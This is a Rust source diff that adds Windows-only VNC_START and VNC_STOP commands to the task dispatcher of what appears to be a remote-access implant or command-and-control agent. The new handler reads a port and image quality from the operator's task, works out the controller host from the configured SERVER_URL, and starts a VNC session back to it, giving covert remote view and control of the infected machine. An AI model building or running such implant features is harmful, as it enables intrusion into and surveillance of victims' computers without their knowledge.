@@ -50,6 +50,9 @@ pub(crate) fn pipe_server_active() -> bool {
 
 #[path = "portfwd.rs"]
 mod portfwd;
+#[cfg(target_os = "windows")]
+#[path = "vnc.rs"]
+mod vnc;
 
 use crate::config;
 use std::sync::atomic::{AtomicBool, AtomicIsize, AtomicU64, Ordering};
@@ -2676,6 +2679,33 @@ pub fn dispatch(t: &mut AgentTransport, task: &TaskWire) {
             let _ = std::fs::remove_file(&inf);
             let _ = std::fs::remove_file(&csr);
             t.send_result(task.id, &format!("{}\n{}{}", o1, o2, cert_b64), "");
+        }
+
+        // ── VNC ───────────────────────────────────────────────────────────────
+        #[cfg(target_os = "windows")]
+        "VNC_START" => {
+            let parts: Vec<&str> = task.args.splitn(5, ' ').collect();
+            let port: u16 = parts.get(0).and_then(|s| s.parse().ok()).unwrap_or(0);
+            let quality: u8 = parts.get(1).and_then(|s| s.parse().ok()).unwrap_or(60);
+            if port == 0 {
+                t.send_result(task.id, "", "VNC_START: missing port");
+            } else {
+                // Extract host from SERVER_URL
+                let url = config::SERVER_URL;
+                let host_part = url.find("://").map(|i| &url[i+3..]).unwrap_or(url);
+                let host = host_part.find(|c| c == ':' || c == '/')
+                    .map(|i| &host_part[..i])
+                    .unwrap_or(host_part);
+                let host = if host.is_empty() { "127.0.0.1" } else { host };
+                vnc::vnc_start(host.to_string(), port, quality);
+                t.send_result(task.id, "[+] VNC session started", "");
+            }
+        }
+
+        #[cfg(target_os = "windows")]
+        "VNC_STOP" => {
+            vnc::vnc_stop();
+            t.send_result(task.id, "[+] VNC session stopped", "");
         }
 
         // ── Agent state ───────────────────────────────────────────────────────
